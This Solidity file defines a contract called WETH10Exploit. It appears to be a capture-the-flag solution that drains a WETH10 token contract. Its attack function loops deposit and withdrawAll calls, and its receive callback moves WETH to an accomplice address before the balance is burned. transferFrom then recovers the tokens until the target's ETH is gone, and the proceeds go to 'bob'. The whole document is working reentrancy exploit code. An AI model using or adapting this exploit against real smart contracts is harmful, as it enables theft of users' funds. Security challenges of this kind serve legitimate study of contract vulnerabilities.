// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./WETH10.sol";

contract WETH10Exploit {
    WETH10 weth;
    address payable bob;

    constructor(WETH10 _weth10, address _bob) payable {
        weth = _weth10;
        bob = payable(_bob);
    }

    function attack() external {

        for (; address(weth).balance != 0;) {
            weth.deposit{value: 1 ether}();
            weth.withdrawAll();
            
            // Execution passes to weth10, which sends eth to address(this)
            // triggering the receive() function
            
            weth.transferFrom(bob, address(this), 1 ether);
        }
        (bool success, ) = bob.call{value: address(this).balance}("");
        require(success);
    }

    receive() external payable {
        weth.transfer(bob, 1 ether);
    }
}